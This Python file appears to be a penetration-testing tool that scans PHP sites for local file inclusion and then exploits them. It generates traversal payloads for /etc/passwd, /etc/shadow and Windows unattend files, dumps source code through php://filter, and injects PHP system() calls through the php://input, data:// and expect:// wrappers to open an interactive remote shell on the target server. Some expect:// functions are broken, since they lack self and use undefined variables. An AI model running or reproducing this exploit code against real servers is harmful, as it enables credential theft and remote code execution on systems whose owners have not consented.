# -*- coding: utf-8 -*-

import sys
import time
import requests
import urllib.parse as urlparse
import base64
from random import randint
from termcolor import colored

    # def sanitation_bypass_url_encode(self):
        # """URL encoded the payload"""
        # original = self.payload
        # self.payload = urllib.parse.quote_plus(self.payload)

        # if self.payload == original or self.filter:
            # return False
        # else:
            # self.url_encode = True
            # self.url_dbl_encode = False
            # return True
	
	# def directory_traversal(self, n):
        # """Creates a directory traversal attack"""
        # traversal = "../"
        # n += 1
        # if self.directories_transversed == 0:
            # self.payload = (n * traversal) + ".." + self.payload
        # else:
            # self.payload = (n * traversal) + self.payload
        # self.directories_transversed = n

def checkIfWindows(path, victimOs):
    if(victimOs == "Windows" or (len(path) > 0 and "\windows\system32" in path.lower())): 
        print (colored("\n[+] OS: Windows\n","white"))
        return True
    return False

def isUnknown(par):
    if(len(par) < 2 or len(par) > 120):
        return "?"
    return par

def cleanOutput(output, newline):
    output = output.replace("\r","").replace("%c" %chr(0), "").replace("\t","") # chr(0)=NUL
    if(newline):
        output = output.replace("\n","")
	
    return output

def checkHttp(url):
    if("http://" not in url and "https://" not in url):
        return "http://%s" %url
    return url

def getDomainFromUrl(url):

    splits = url.split('/')
    if("http://" in url or "https://" in url):
        return "%s" % splits[2] # http://127.0.0.1/dvwa/index.php --> 127.0.0.1
    return "%s" % splits[0] # 127.0.0.1/dvwa/index.php --> 127.0.0.1

def correctUrl(url): # ex: 'http://127.0.0.1/lfi.php?file=/etc/passwd' --> 'http://127.0.0.1/lfi.php?file='
	if(url[len(url)-1] == '='):
		return url
	eq = SubstrIndexes(url,"=")
	if(len(eq) == 0):
		print ("\n[ERROR] Invalid URL syntax!\n")
		sys.exit()
	last = eq[len(eq)-1]

	return url[:(last+1)]

def SubstrIndexes(resp, toFind):
    if(len(toFind) > len(resp)):
        return []

    found = False
    indexes = []

    for x in range(0,(len(resp)-len(toFind))+1):
        if(ord(resp[x]) == ord(toFind[0])):
            found = True
            for i in range(0,len(toFind)):
                if(ord(resp[x+i]) != ord(toFind[i])):
                    found = False
                    break
        if(found):
            indexes.append(x)
            found = False
            x += len(toFind)

    return indexes

def generateRandom():
    return "RHVuZ0h1eQ%s" %randint(40,999999)

def exit():
    print ("\nSee you!\n")
    sys.exit(0)

# SCANNER
class Scanner:
    """Sends payload via a GET request for scanning"""
    def __init__(self, url, key, payload_list, null_byte, gen_headers, parameters, os):
        """Initializes variable for scanning"""
        self.url = url
        self.key = key
        self.payload_list = payload_list
        self.null_byte = null_byte
        self.gen_headers = gen_headers
        self.parameters = parameters
        self.key = key
        self.os = os

    def find_injection_points(self):
        """
        Finds the payload injection points in the URL
        """
        try:
            for parameter in self.parameters:
                name = parameter.split("=")[0]
                #value = parameter.split("=")[1]
                #key.append(name)
                self.key.append(name)
                return 1

        except IndexError:
            return -1

    def location(self):
        """
	    Linux File Locations 
	    or 
	    Windows File Locations 
	    or 
        OS X/macOS File Locations
	    """
        if self.os == 'linux':
            test_file = ['etc/passwd']
            #test_file = ['etc/passwd',  'etc/shadow',  'etc/issue',  'proc/version',  'etc/profile', 'root/.bash_history', 'var/log/dmessage', 'var/mail/root', 'var/spool/cron/crontabs/root']
        elif self.os == 'windows':
            test_file = ['WINDOWS/system32/drivers/etc/hosts', 'WINDOWS/system32/win.ini', 'WINDOWS/system32/debug/NetSetup.log', 'WINDOWS/system32/config/AppEvent.Evt', 'WINDOWS/system32/config/SecEvent.Evt', 'WINDOWS/Panther/unattend.txt', 'WINDOWS/Panther/unattend.xml', 'WINDOWS/Panther/unattended.xml', 'WINDOWS/Panther/sysprep.inf']
        else: #OS X/macOS
            test_file = ['etc/fstab', 'etc/master.passwd', 'etc/resolv.conf', 'etc/sudoers', 'etc/sysctl.conf']
        return test_file

    def directory_transversal(self):
        """
        Gets the parameter and adds the ../../.. ...
        """
        test_file = self.location()

        for x in range(0, len(test_file)):
            for y in range(0, 7):
                if y == 0:
                    temp = ('/' + test_file[x])
                    self.payload_list.append(temp)
                else:
                    temp = ((y * '../') + test_file[x])
                    self.payload_list.append(temp)
        return self.payload_list

    def generic_null_byte(self):
        """Just addes %00 to the end of the payload"""
        temp = []
        for payload in self.payload_list:
            temp.append(payload + "%00")
            print(temp)
        return temp

    def generate_payloads(self):
        if self.find_injection_points():
            print("Generating Payloads")
            self.directory_transversal()
            if self.null_byte == True:
                self.payload_list = self.generic_null_byte()

    def scan(self):
        url_not_para = self.url.split('?')[0]
        para = {}

        for i in range(0, len(self.payload_list)):
            para[self.key[0]] = self.payload_list[i]
            r = requests.get(url_not_para, params = para, headers=self.gen_headers, verify=False)

#---------------------------------------------------------------------------------


class Exploiters:
    """PHP filter"""
    def __init__(self, url, gen_headers, ):
        """Initializes variables for getting payloads via PHP Filter"""
        self.url = url
        self.gen_headers = gen_headers

    #-----------------------------------------------------------------------------#
    # php://filter
    def base64_check(self, char):
        temp = ord(char)
        if((temp >= 65 and temp <= 90) or (temp >= 97 and temp <= 122) or (temp >= 48 and temp <= 57) or (temp == 43) or (temp == 47) or (temp == 61)):
    	    return True;
        return False;

    def extract_phpfilter(self, content):
        ftemp = ""
        found = []

        lines = content.split('\n')
        for line in lines:
            ftemp = ""
            length = len(line)

            for x in range(0,length):
                if(self.base64_check(line[x])):
                    ftemp += line[x]
                else:
                    if(length > 100 and self.base64_check(line[x]) is False and len(ftemp) >= (length/2)):
                        break
                    ftemp = ""

            if(len(ftemp) > 0):
                found.append(ftemp)

        final = ""
        if(len(found) > 0):
            max = 0
            index = -1
            for x in range(0,len(found)):
                length = len(found[x])
                if(length > max):
                    max = length
                    index = x
            final = found[index]

        return final

    def run_phpfilter(self):

        url_not_val = self.url.split('=')[0]
        filterpage = "1"
        while(True):
            filterpage = input("[*] Enter the page you want to steal information of ['0' to exit] -> ")
            if(filterpage == "0"):
                break
            filterurl = "%s=php://filter/convert.base64-encode/resource=%s" %(url_not_val, filterpage)

            r = requests.get(filterurl, headers=self.gen_headers, timeout=15, verify=False)
            filtercontent = r.text

            found = self.extract_phpfilter(filtercontent)

            if(len(found) == 0):
                print( "[-] Any interesting Base64 code found :(")
            else:
                see = input("[+] Found possible interesting Base64 code. Do you want me to show it? (y/n) ")
                if(see == "y" or see == "Y" or see == "yes"):
                    print ("-------------------------------------------------------------------------------------------------------------------------")
                    print ("%s" %found)
                    print ("-------------------------------------------------------------------------------------------------------------------------\n")

                decode = input("[*] Do you want me to decode it? (y/n) ")
                if(decode == "y" or decode == "Y" or decode == "yes"):
                    decoded = base64.b64decode(found)
                    print ("\n\n--Decoded text-----------------------------------------------------------------------------------------------------------\n")
                    print ("%s" %decoded.decode("utf-8"))
                    print ("\n-------------------------------------------------------------------------------------------------------------------------\n")

            print ("")


    #-----------------------------------------------------------------------------#
    # php://input

    def send_phpinput_cmd(self, cmd, inputurl):

        if(self.url[-11:] == "php://input"):
            inputurl = inputurl[:-11]

        inputurl = "%sphp://input" %(inputurl)
        phpcmd = cmd[:6] == "php://"
        body = ""

        if(phpcmd):
            cmd = cmd[6:]
            length = 25+len(cmd)
            body = "RHVuZ0h1eQ ** <?php %s?> **" %cmd
        else:
            length = 36+len(cmd)
            body = "RHVuZ0h1eQ ** <?php system('%s');?> **" %cmd
	
        self.gen_headers['Content-Length'] = '%s' %length
        r = requests.post(url=inputurl, headers=self.gen_headers, data=body)

        return r.text

    def extract_phpinput_resq(self, resp):
        strs = SubstrIndexes(resp,"RHVuZ0h1eQ **")

        try:
            point = strs[0]+14
        except:
            return ""

        getOutput = ""
        while(point < len(resp)-1 and (resp[point] != '*' or resp[point+1] != '*')):
            getOutput += resp[point]
            point += 1

        return getOutput[:-1]

    def run_phpinput(self, os):

        inputurl = checkHttp(self.url)
        inputurl = correctUrl(inputurl)
        resp = self.send_phpinput_cmd("echo Pentest", inputurl)
        getIndexes = SubstrIndexes(resp,"RHVuZ0h1eQ **")
        phpcmd = False

        if(len(getIndexes) == 0):
            return
        if("system() has been disabled for security reasons in" in resp or "Pentest" not in resp):
            phpcmd = True

        print ("\n[+] The website seems to be vulnerable. Opening a Shell..")

        if(phpcmd is False):
            _id = cleanOutput(self.extract_phpinput_resq(self.send_phpinput_cmd("id",inputurl)), True)
            if(len(_id) == 0):
                path = cleanOutput(self.extract_phpinput_resq(self.send_phpinput_cmd("path",inputurl)), True)
                if(checkIfWindows(path, os)):
                    os = "windows"

            print (colored("[If you want to send PHP commands rather than system commands add php:// before them (ex: php:// fwrite(fopen('a.txt','w'),\"content\");]\n","red"))
            whoami = isUnknown(cleanOutput(self.extract_phpinput_resq(self.send_phpinput_cmd("whoami",inputurl)), True))
            if(os != "Windows"):
                pwd = cleanOutput(self.extract_phpinput_resq(self.send_phpinput_cmd("pwd",inputurl)), True)
            else:
                pwd = cleanOutput(self.extract_phpinput_resq(self.send_phpinput_cmd("cd",inputurl)), True)
        else:
            print (colored("[system() calls have been disabled by the website, you can just run php commands (ex: fwrite(fopen('a.txt','w'),\"content\");]\n","red"))
            whoami = isUnknown(cleanOutput(self.extract_phpinput_resq(self.send_phpinput_cmd("php://echo get_current_user();",inputurl)), True))
            pwd = isUnknown(cleanOutput(self.extract_phpinput_resq(self.send_phpinput_cmd("php://echo getcwd();",inputurl)), True))

        time.sleep(1)
        domain = getDomainFromUrl(inputurl)
        cmd = ""
        while(cmd != "exit" and cmd != "quit" and cmd != "php://exit" and cmd != "php://quit"):
            if(phpcmd):
                cmd = input("%s@%s:%s$ PHP:// " %(whoami,domain,pwd))
                if(cmd[:6] != "php://"):
                    cmd = "php://%s" %cmd
            else:
                cmd = input("%s@%s:%s$ " %(whoami,domain,pwd))
            if(cmd != "exit" and cmd != "quit" and cmd != "php://exit" and cmd != "php://quit"):
                print (cleanOutput(self.extract_phpinput_resq(self.send_phpinput_cmd(cmd,inputurl)), False))
        exit()

    #-----------------------------------------------------------------------------#
    # data://

    def send_data_cmd_generic(self, reqUrl):
        content = (requests.get(reqUrl,headers=self.gen_headers,timeout=15, verify=False)).text
        return content

    def send_data_cmd_simple_nosl(self, cmd, dataUrl):
        #print "requested URL: %sdata:,%s" %(url,cmd)
        return self.send_data_cmd_generic("%sdata:,%s" %(dataUrl, cmd))

    def send_data_cmd_simple_sl(self, cmd, dataUrl):
        #print "requested URL: %sdata://,%s" %(url,cmd)
        return self.send_data_cmd_generic("%sdata://,%s" %(dataUrl, cmd))

    def send_data_cmd_b64_nosl(self, cmd, dataUrl):
        cmd_as_bytes = str.encode(cmd)
        enc = base64.b64encode(cmd_as_bytes)
        #print "requested URL: %sdata:,%s" %(url,enc)
        return self.send_data_cmd_generic("%sdata:text/plain;base64,%s" %(dataUrl,enc))

    def send_data_cmd_b64_sl(self, cmd, dataUrl):
        cmd_as_bytes = str.encode(cmd)
        enc = base64.b64encode(cmd_as_bytes)
        #print "requested URL: %sdata://text/plain;base64,%s" %(url,enc)
        return self.send_data_cmd_generic("%sdata://text/plain;base64,%s" %(dataUrl,enc))

    def send_data_cmd_default(self, cmd, dataUrl, choice):
        if(choice == 1):
            return self.send_data_cmd_simple_nosl(cmd, dataUrl)
        elif(choice == 2):
            return self.send_data_cmd_b64_nosl(cmd, dataUrl)
        elif(choice == 3):
            return self.send_data_cmd_simple_sl(cmd, dataUrl)
        else:
            return self.send_data_cmd_b64_sl(cmd, dataUrl)

    def extract_data_resq(self, resp):
        return self.extract_phpinput_resq(resp)

    def cleanDataCmd(self, cmd):
        newcmd = "RHVuZ0h1eQ ** <?php "

        if(cmd[:6] != "php://"):
            cmds = cmd.split('&')
            for c in cmds:
                if(len(c) > 0):
                    newcmd += "system('%s');" %c

        else:
            newcmd += cmd[6:]

        newcmd += "?> **"

        return newcmd

    def run_data(self, os):

        dataurl = correctUrl(self.url)
        dataurl = checkHttp(dataurl)
        rand_str = generateRandom()
        cmd = "<?php system(\"echo %s\");?>" %rand_str
        found = 0
        sys_disabled = False

        for i in range(1,5):
            content = self.send_data_cmd_default(cmd, dataurl, i)
            if "wrapper is disabled" in content or "no suitable wrapper could be found" in content or "Unable to find the wrapper" in content:
                return
            if("system() has been disabled for security reasons" in content or rand_str not in content):
                sys_disabled = True
                break

            '''print "\nUsing i = %s I found content:\n" %i
            print "----------------------------------------------------------"
            print content
            print "----------------------------------------------------------\n\n"'''
            indexes = SubstrIndexes(content, rand_str)
            if(len(indexes) > 0 and ("echo %s" %rand_str) not in content and ("echo%%20%s" %rand_str) not in content):
                found = i
                break

        # check if system() calls have been disabled
        # -----------------------------------------------------------------
        if(sys_disabled):
            for i in range(1,5):
                cmd = "<?php echo %s;?>" %rand_str
                content = self.send_data_cmd_default(cmd, dataurl, i)
                indexes = SubstrIndexes(content,rand_str)
                if(len(indexes) > 0 and ("echo %s" %rand_str) not in content and ("echo%%20%s" %rand_str) not in content):
                    found = i
        # -----------------------------------------------------------------

        #print "found = %s" %found
        if(found != 0):
            print ("\n[+] The website seems to be vulnerable. Opening a Shell..")
            if(sys_disabled):
                print (colored("[system() calls have been disabled by the website, you can just run php commands (ex: fwrite(fopen('a.txt','w'),\"content\");]\n","red"))
            else:
                print (colored("[If you want to send PHP commands rather than system commands add php:// before them (ex: php:// fwrite(fopen('a.txt','w'),\"content\");]\n","red"))
            time.sleep(1)

            domain = getDomainFromUrl(dataurl)
            whoami = ""
            pwd = ""

            if(sys_disabled is False):
                whoami = cleanOutput(self.extract_data_resq(self.send_data_cmd_default(self.cleanDataCmd("whoami"), dataurl, found)), True)
                pwd = isUnknown(cleanOutput(self.extract_data_resq(self.send_data_cmd_default(self.cleanDataCmd("pwd"), dataurl, found)), True))
                if(pwd == "?"):
                    path = cleanOutput(self.extract_data_resq(self.send_data_cmd_default(self.cleanDataCmd("path"), dataurl, found)), True)
                    if(checkIfWindows(path, os)):
                        os = "Windows"
                        pwd = isUnknown(cleanOutput(self.extract_data_resq(self.send_data_cmd_default(self.cleanDataCmd("cd"), dataurl, found)), True))
            else:
                whoami = cleanOutput(self.extract_data_resq(self.send_data_cmd_default(self.cleanDataCmd("php://echo get_current_user();"), dataurl, found)), True)
                whoami = isUnknown(whoami)
                pwd = isUnknown(cleanOutput(self.extract_data_resq(self.send_data_cmd_default(self.cleanDataCmd("php://echo getcwd();"), dataurl, found)), True))

            while(cmd != "exit" and cmd != "quit" and cmd != "php://exit" and cmd != "php://quit"):
                if(sys_disabled):
                    cmd = input("%s@%s:%s$ PHP:// " %(whoami,domain,pwd))
                    if(cmd[:6] != "php://"):
                        cmd = "php://%s" %cmd
                else:
                    cmd = input("%s@%s:%s$ " %(whoami,domain,pwd))
                cmd = cmd.replace("\"","'")
                if(cmd != "exit" and cmd != "quit" and cmd != "php://exit" and cmd != "php://quit"):
                        cmd = self.cleanDataCmd(cmd)
                        print ("%s\n" %cleanOutput(self.extract_data_resq(self.send_data_cmd_default(cmd,dataurl,found)), False))
            exit()
    #-----------------------------------------------------------------------------#
    # expect://

    def send_expect_cmd(cmd,url):
        newurl = "%sexpect://%s" %(url,cmd)
        content = (requests.get(newurl,headers=gen_headers,timeout=15, verify=False)).text
        return content

    def extract_expect_resq(resp):
        return extract_phpinput_resq(resp)

    def run_expect():

        expecturl = correctUrl(expecturl)
        expecturl = checkHttp(expecturl)

        rand_str = generateRandom()
        cmd = "echo %s" %rand_str
        content = send_expect_cmd(cmd, expecturl)
        indexes = SubstrIndexes(content, rand_str)
        found = len(indexes) > 0

        if(found and ("echo %s" %rand_str) not in content and "Unable to find the wrapper &quot;expect&quot;" not in content and "wrapper is disabled" not in content and ("echo%%20%s" %rand_str) not in content):
            print ("\n[+] The website seems to be vulnerable. Opening a System Shell..\n")
            time.sleep(1)

            domain = getDomainFromUrl(expecturl)
            whoami = cleanOutput(extract_expect_resq(send_expect_cmd("whoami", expecturl)), True)
            pwd = isUnknown(cleanOutput(extract_expect_resq(send_expect_cmd("pwd", expecturl)), True))
            if(pwd == "?"):
                path = cleanOutput(extract_expect_resq(send_expect_cmd("path", expecturl)), True)
                if(checkIfWindows(path)):
                    victimOs = "Windows"
                    pwd = isUnknown(cleanOutput(extract_expect_resq(send_expect_cmd("cd", expecturl)), True))

            while(cmd != "exit" and cmd != "quit"):
                cmd = input("%s@%s:%s$ " %(whoami,domain,pwd))
                if(cmd != "exit" and cmd != "quit"):
                    cmd = "RHVuZ0h1eQ ** %s **" %cmd
                    print (cleanOutput(extract_expect_resq(send_expect_cmd(cmd,expecturl)), False))
            exit()
    #-----------------------------------------------------------------------------#
    # php://zip

    def php_zip():
        pass


# REQUEST
class TestConnect:
    """Class used for testing requests"""
    def __init__(self, url, gen_headers):
        self.url = url
        self.gen_headers = gen_headers

    def urlparse(self):
        """
        Parse the URL to the GET parameters
        """
        return urlparse.urlparse(self.url)


    def target(self):
        """
        Is the target valid?
        """
        try:
            r = requests.head(self.url, headers = self.gen_headers)
        except requests.ConnectionError:
            print("Connection Error: \t" + self.url)
            return -1
        except requests.exceptions.MissingSchema:
            print("Invalid URL:\t" + self.url)
            return -1

        print("Status code " + str(r.status_code))
        if r.status_code == 200:
            print(self.url + "\treturned " + str(200))
            return 1
        return 1


def main():
    url = input("\n[*] Enter url (ex: http://127.0.0.1/dvwa/) -> ")
    php = True
    os = 'linux'
    key = []
    #key_value = {}
    payload_list = [] #[../../../../../]/etc/passwd
    parameters = []
    null_byte = False #%00
    gen_headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20110201 Firefox/67.0',
                   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                   'Accept-Language':'vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3',
                   'Accept-Encoding': 'gzip, deflate',
                   'Connection':'keep-alive'}

    input_cookie = input("\n[*] Enter cookies if needed (ex: 'PHPSESSID=12345;par=something') [just enter if none] -> ")
    if len(input_cookie) > 0:
        gen_headers['Cookie'] = input_cookie
    #gen_headers['Cookie'] = "security=low; PHPSESSID=n3o05a33llklde1r2upt98r1k2"
    test = TestConnect(url, gen_headers)

    if test.target() == 1:

        url_parameters = test.urlparse()
        print("Scheme:\t" + str(url_parameters.scheme))
        print("Netloc:\t" + str(url_parameters.netloc))
        print("Path:\t" + str(url_parameters.path))
        print("Params:\t" + str(url_parameters.params))
        print("Query:\t" + str(url_parameters.query))
        print("Frag:\t" + str(url_parameters.fragment))
        if url_parameters.query:
            if url_parameters.query != "":
                queryString = url_parameters.query
                parameters = queryString.split("&")
                print("Target has " + str(len(parameters)) + " injectable GET parameters to test.")
                for x in range(0, len(parameters)):
                    print("GET parameter " + str(x + 1) + ": \t" + parameters[x])

				# Scanner
                scanner_payloads = Scanner(url, key, payload_list, null_byte, gen_headers, parameters, os)
                scanner_payloads.generate_payloads()
                scanner_payloads.scan()
                # PHP Filter
                exploiters_payloads = Exploiters(url, gen_headers)
                #exploiters_payloads.run_phpfilter()
                # PHP Input
                #exploiters_payloads.run_phpinput(os)
				# Data
                exploiters_payloads.run_data(os)
        else:
            print("No GET parameters")
    else:
        print("Failed connection: " + url)


if __name__== "__main__":
    main()